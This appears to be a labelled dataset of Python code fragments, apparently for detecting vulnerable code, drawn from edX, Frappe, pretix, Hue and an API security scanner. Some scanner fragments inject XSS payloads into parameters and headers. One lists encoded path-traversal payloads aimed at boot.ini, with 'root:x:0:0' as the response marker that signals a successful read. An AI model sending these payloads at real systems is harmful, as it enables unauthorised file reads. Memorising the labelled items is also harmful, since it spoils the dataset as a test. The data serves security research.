\"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters", "label": 0}, {"snippet_id": 3164, "code": "=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\":", "label": 0}, {"snippet_id": 25859, "code": "=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None, widget=DatePickerWidget(), ) elif q.type==Question.TYPE_TIME: field=forms.TimeField( label=q.question", "label": 0}, {"snippet_id": 42758, "code": ".fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) ", "label": 0}, {"snippet_id": 50438, "code": "): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries.pop(0) request", "label": 0}, {"snippet_id": 54871, "code": " transaction from django.http import( HttpResponseBadRequest, HttpResponseForbidden, JsonResponse, ) from django.shortcuts import get_object_or_404 from django.views.decorators.http import( require_POST ) from", "label": 0}, {"snippet_id": 27359, "code": " _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj", "label": 0}, {"snippet_id": 21384, "code": "*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 1}, {"snippet_id": 43860, "code": "=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse", "label": 0}, {"snippet_id": 14562, "code": "() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be", "label": 1}, {"snippet_id": 33049, "code": ".has_a_single_h1=has_a_single_h1 def run(self, tree): for toc_node in tree.findall(\".//*[@class='toc']\"): toc_ul=toc_node[0] if self.has_a_single_h1: toc_ul_li=toc_ul[0] ul_with_the_desired_toc_entries=toc_ul_li[1]", "label": 0}, {"snippet_id": 19089, "code": ": paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure", "label": 0}, {"snippet_id": 17312, "code": ".MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns", "label": 0}, {"snippet_id": 50911, "code": " ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from", "label": 0}, {"snippet_id": 46696, "code": " if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags", "label": 0}, {"snippet_id": 12616, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=", "label": 0}, {"snippet_id": 25188, "code": ".base.models.tax import EU_COUNTRIES from pretix.base.settings import PERSON_NAME_SCHEMES from pretix.base.templatetags.rich_text import rich_text from pretix.control.forms import SplitDateTimeField from", "label": 0}, {"snippet_id": 33862, "code": "=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): ", "label": 0}, {"snippet_id": 39591, "code": " any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\")", "label": 0}, {"snippet_id": 24045, "code": " expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp", "label": 0}, {"snippet_id": 29395, "code": " Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div", "label": 0}, {"snippet_id": 28167, "code": " serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept", "label": 0}, {"snippet_id": 48666, "code": " request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect(\"/admin?error=noyb\")", "label": 1}, {"snippet_id": 12547, "code": "\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 42172, "code": "\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and", "label": 0}, {"snippet_id": 7304, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$',", "label": 0}, {"snippet_id": 55078, "code": " entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects", "label": 0}, {"snippet_id": 12497, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort", "label": 0}, {"snippet_id": 9616, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns", "label": 0}, {"snippet_id": 10741, "code": " self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / ", "label": 0}, {"snippet_id": 51204, "code": " GroupResource(resources.ModelResource): class Meta: model=Group class UserAdmin(BaseUserAdmin, ImportExportModelAdmin): resource_class=UserResource inlines=(DashboardUserInline,) list_display=('username", "label": 0}, {"snippet_id": 54592, "code": " form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5", "label": 0}, {"snippet_id": 25612, "code": " max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'), initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),", "label": 0}, {"snippet_id": 26293, "code": "'vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError", "label": 0}, {"snippet_id": 51342, "code": " obj, form, change) actions=[] @admin.register(UrlList) class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'account',) search_fields=('name', 'account__name') list_filter", "label": 0}, {"snippet_id": 22692, "code": "'change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment", "label": 0}, {"snippet_id": 16270, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id':", "label": 0}, {"snippet_id": 26207, "code": " if not data.get('is_business'): data['company']='' if self.event.settings.invoice_address_required: if data.get('is_business') and not data.get('company'): raise ValidationError(_('You need to provide", "label": 0}, {"snippet_id": 31245, "code": ", show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup", "label": 0}, {"snippet_id": 38673, "code": " in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value", "label": 0}, {"snippet_id": 27956, "code": ".upload upload_key=self.request.get('upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo.from_key(upload_key) if not blob_info: raise helpers.EarlyExitException('Failed to upload.'", "label": 0}, {"snippet_id": 37381, "code": "(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet')", "label": 0}, {"snippet_id": 21830, "code": ": urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid", "label": 0}, {"snippet_id": 43545, "code": "*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param", "label": 0}, {"snippet_id": 54727, "code": " a=form.save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\"", "label": 0}, {"snippet_id": 32230, "code": ".path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help", "label": 0}, {"snippet_id": 49272, "code": ".field_name=field self.label=label self.render_function=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\") and self.field_name !=\"__str__", "label": 0}, {"snippet_id": 18912, "code": "-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds", "label": 0}, {"snippet_id": 21858, "code": ".openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$'", "label": 0}, {"snippet_id": 46884, "code": "(self): return await GithubUser.get(gid=self.github_id) @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id, content, ref_id=0", "label": 0}, {"snippet_id": 36430, "code": "\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) ", "label": 0}, {"snippet_id": 30243, "code": " \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0'", "label": 0}, {"snippet_id": 44257, "code": ".content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }", "label": 1}, {"snippet_id": 1026, "code": " xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url", "label": 1}, {"snippet_id": 23071, "code": "/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 51324, "code": ".changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions", "label": 0}, {"snippet_id": 8408, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns", "label": 0}, {"snippet_id": 7745, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P", "label": 0}, {"snippet_id": 3936, "code": ": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload", "label": 0}, {"snippet_id": 37588, "code": "=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"", "label": 0}, {"snippet_id": 31526, "code": ".select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[2]) ", "label": 0}, {"snippet_id": 26286, "code": " country.')) try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except", "label": 0}, {"snippet_id": 1394, "code": "], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul", "label": 0}, {"snippet_id": 39740, "code": " link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t", "label": 0}, {"snippet_id": 48916, "code": " self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self", "label": 1}, {"snippet_id": 46512, "code": " massaged_collection=collection.to_dict() if request.GET.get('is_mobile'): massaged_collection['absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection", "label": 0}, {"snippet_id": 18081, "code": "+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render", "label": 0}, {"snippet_id": 33931, "code": ".blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe", "label": 0}, {"snippet_id": 26831, "code": "%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', '", "label": 0}, {"snippet_id": 52698, "code": "'message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{", "label": 0}, {"snippet_id": 48076, "code": " \"_\")) if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk", "label": 0}, {"snippet_id": 45854, "code": " coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_", "label": 0}, {"snippet_id": 1500, "code": "'../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods", "label": 0}, {"snippet_id": 1036, "code": " print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request", "label": 1}, {"snippet_id": 41127, "code": "\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value", "label": 0}, {"snippet_id": 49637, "code": " SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column", "label": 0}, {"snippet_id": 3181, "code": " \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True", "label": 0}, {"snippet_id": 46932, "code": " user_id), return_exceptions=True ) return obj async def del_comment(self, user_id, comment_id): c=await Comment.get(id=comment_id) if c and c.github_id==user_id and c.post_id==self.id: await c.delete()", "label": 0}, {"snippet_id": 3617, "code": "'': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param", "label": 0}, {"snippet_id": 35317, "code": " not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links", "label": 0}, {"snippet_id": 51730, "code": "'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat", "label": 0}, {"snippet_id": 4002, "code": ",scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\":", "label": 0}, {"snippet_id": 39594, "code": ": \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for", "label": 0}, {"snippet_id": 47674, "code": ">Choose a password: ')) f.add_content(PasswordField(name='password', required=False)) f.add_content(PlainText('Confirm your password: ')) f.add_content(PasswordField(name='confirm_password', required=False))", "label": 0}, {"snippet_id": 2874, "code": " vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss", "label": 0}, {"snippet_id": 14628, "code": ").format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss", "label": 0}, {"snippet_id": 8760, "code": "'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES", "label": 0}, {"snippet_id": 34605, "code": ".parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, ", "label": 0}, {"snippet_id": 22804, "code": "[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name", "label": 1}, {"snippet_id": 40463, "code": "\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not", "label": 0}, {"snippet_id": 19523, "code": "): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure", "label": 0}, {"snippet_id": 27806, "code": "]=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else: logging.exception(exception) if helpers.should_render_json", "label": 0}, {"snippet_id": 10240, "code": " test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name", "label": 1}, {"snippet_id": 40813, "code": " _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t", "label": 0}, {"snippet_id": 46375, "code": " response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection['template']['extracode']=escape(collection['template']", "label": 0}, {"snippet_id": 10783, "code": "=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss',", "label": 1}, {"snippet_id": 53501, "code": " !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id", "label": 0}, {"snippet_id": 22482, "code": "(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/", "label": 0}, {"snippet_id": 34151, "code": " def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe", "label": 0}, {"snippet_id": 23856, "code": "='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid", "label": 0}, {"snippet_id": 41456, "code": " `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len", "label": 0}, {"snippet_id": 24569, "code": ".serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize(", "label": 0}, {"snippet_id": 35878, "code": "\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"", "label": 0}, {"snippet_id": 46445, "code": ".doc.get() dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response[", "label": 0}, {"snippet_id": 23983, "code": " num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific", "label": 0}, {"snippet_id": 22003, "code": "/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings", "label": 0}, {"snippet_id": 19590, "code": " run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout", "label": 0}, {"snippet_id": 45534, "code": ", request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle", "label": 0}, {"snippet_id": 23833, "code": "=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 34194, "code": " cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module", "label": 0}, {"snippet_id": 44493, "code": " workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={", "label": 0}, {"snippet_id": 46533, "code": ".user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request", "label": 0}, {"snippet_id": 43887, "code": "() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df", "label": 0}, {"snippet_id": 16230, "code": "', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 34730, "code": "(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif", "label": 0}, {"snippet_id": 26863, "code": " hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host ", "label": 0}, {"snippet_id": 9587, "code": "/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade", "label": 0}, {"snippet_id": 24453, "code": ".default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get(", "label": 1}, {"snippet_id": 40716, "code": "(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields", "label": 0}, {"snippet_id": 4260, "code": ",scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL'", "label": 0}, {"snippet_id": 9169, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), 